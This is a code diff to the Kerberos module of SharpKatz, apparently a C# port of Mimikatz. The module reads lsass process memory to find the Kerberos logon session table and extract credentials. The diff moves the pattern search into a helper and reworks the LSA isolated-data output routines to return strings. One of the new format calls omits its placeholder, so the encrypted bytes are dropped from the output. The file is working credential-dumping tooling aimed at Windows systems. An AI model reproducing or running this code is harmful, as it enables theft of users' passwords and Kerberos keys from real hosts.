@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using static SharpKatz.Module.Msv1;
 using static SharpKatz.Natives;
+using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
 
 namespace SharpKatz.Module
 {
@@ -16,7 +17,7 @@ namespace SharpKatz.Module
 
         static long max_search_size = 500000;
 
-        static int AES_128_KEY_LENGTH = 16;
+        //static int AES_128_KEY_LENGTH = 16;
         static int AES_256_KEY_LENGTH = 32;
 
         const int KERB_ETYPE_NULL = 0;
@@ -255,43 +256,9 @@ namespace SharpKatz.Module
 
         public static unsafe List<byte[]> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
-            RTL_AVL_TABLE entry;
-            long kerbUnloadLogonSessionTableSignOffset, kerbUnloadLogonSessionTableOffset;
             IntPtr kerbUnloadLogonSessionTableAddr;
-            IntPtr kerberosLocal;
-            IntPtr llCurrent;
-
-            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
-            kerberosLocal = Natives.LoadLibrary("kerberos.dll");
-            if (kerberosLocal == IntPtr.Zero)
-            {
-                Console.WriteLine("[x] Kerberos Error: Could not load kerberos.dll into local process");
-                return null;
-            }
-            //Console.WriteLine("[*] Kerberos Loaded kerberos.dll at address {0:X}", kerberosLocal.ToInt64());
-
-            byte[] tmpbytes = new byte[max_search_size];
-            Marshal.Copy(kerberosLocal, tmpbytes, 0, (int)max_search_size);
-
-            // Search for SspCredentialList signature within wdigest.dll and grab the offset
-            kerbUnloadLogonSessionTableSignOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.KerbUnloadLogonSessionTableSign);
-            if (kerbUnloadLogonSessionTableSignOffset == 0)
-            {
-                Console.WriteLine("[x] Kerberos Error: Could not find KerbUnloadLogonSessionTable signature\n");
-                return null;
-            }
-            //Console.WriteLine("[*] Kerberos KerbUnloadLogonSessionTable offset found as {0}", kerbUnloadLogonSessionTableSignOffset);
-
-            // Read memory offset to SspCredentialList from a "RAX,qword ptr [SspCredentialList]" asm
-            IntPtr tmp_p = IntPtr.Add(msvMem, (int)kerbUnloadLogonSessionTableSignOffset + oshelper.KerbUnloadLogonSessionTableOffset);
-            byte[] kerbUnloadLogonSessionTableOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
-            kerbUnloadLogonSessionTableOffset = BitConverter.ToInt32(kerbUnloadLogonSessionTableOffsetBytes, 0);
-
-            // Read pointer at address to get the true memory location of SspCredentialList
-            tmp_p = IntPtr.Add(msvMem, (int)kerbUnloadLogonSessionTableSignOffset + oshelper.KerbUnloadLogonSessionTableOffset + sizeof(int) + (int)kerbUnloadLogonSessionTableOffset);
-            byte[] kerbUnloadLogonSessionTableAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
-            kerbUnloadLogonSessionTableAddr = new IntPtr(BitConverter.ToInt64(kerbUnloadLogonSessionTableAddrBytes, 0));
-
+            kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, "kerberos.dll", max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);
+            
             //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
 
             GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);
@@ -545,14 +512,18 @@ namespace SharpKatz.Module
             byte[] unkData2 = new byte[16];
             Marshal.Copy((IntPtr)blob.unkData2, unkData2, 0, 16);
 
-            Console.Write("\n\t   * LSA Isolated Data: %.*S", blob.typeSize, Marshal.PtrToStringAuto(pntData));
-            Console.Write("\n\t     Unk-Key  : "); Utility.PrintHexBytes(unkKeyData);
-            Console.Write("\n\t     Encrypted: "); Utility.PrintHexBytes(encrypted);
-            Console.Write("\n\t\t   SS:{0}, TS:{1}, DS:{2}", blob.structSize, blob.typeSize, blob.origSize);
-            Console.Write("\n\t\t   0:0x%x, 1:0x{0:X}, 2:0x{1:X}, 3:0x{2:X}, 4:0x{3:X}, E:", blob.unk0, blob.unk1, blob.unk2, blob.unk3, blob.unk4);
-            Console.Write(Utility.PrintHexBytes(unkData2)); Console.Write(", 5:0x{0:X}", blob.unk5);
+            StringBuilder sb = new StringBuilder();
 
-            return "TODO";
+            sb.Append(string.Format("\n\t   * LSA Isolated Data: %.*S", blob.typeSize, Marshal.PtrToStringAuto(pntData)));
+
+            sb.Append(string.Format("\n\t     Unk-Key  : {0}",Utility.PrintHexBytes(unkKeyData)));
+            sb.Append(string.Format("\n\t     Encrypted: ",Utility.PrintHexBytes(encrypted)));
+            sb.Append(string.Format("\n\t\t   SS:{0}, TS:{1}, DS:{2}", blob.structSize, blob.typeSize, blob.origSize));
+            sb.Append(string.Format("\n\t\t   0:0x%x, 1:0x{0:X}, 2:0x{1:X}, 3:0x{2:X}, 4:0x{3:X}, E:", blob.unk0, blob.unk1, blob.unk2, blob.unk3, blob.unk4));
+            sb.Append(string.Format(Utility.PrintHexBytes(unkData2)));
+            sb.Append(string.Format(", 5:0x{0:X}", blob.unk5));
+
+            return sb.ToString();
         }
 
         private static unsafe string GenericEncLsaIsoOutput(ENC_LSAISO_DATA_BLOB blob, int size)
@@ -566,11 +537,13 @@ namespace SharpKatz.Module
             byte[] unkData2 = new byte[16];
             Marshal.Copy((IntPtr)blob.unkData2, unkData2, 0, 16);
 
-            Console.Write("\n\t   * unkData1 : "); Utility.PrintHexBytes(unkData1);
-            Console.Write("\n\t     unkData2 : "); Utility.PrintHexBytes(unkData2);
-            Console.Write("\n\t     Encrypted: "); Utility.PrintHexBytes(encrypted);
+            StringBuilder sb = new StringBuilder();
 
-            return "TODO";
+            sb.Append(string.Format("\n\t   * unkData1 : {0}", Utility.PrintHexBytes(unkData1)));
+            sb.Append(string.Format("\n\t     unkData2 : {0}", Utility.PrintHexBytes(unkData2)));
+            sb.Append(string.Format("\n\t     Encrypted: {0}", Utility.PrintHexBytes(encrypted)));
+
+            return sb.ToString();
         }
     }
 }
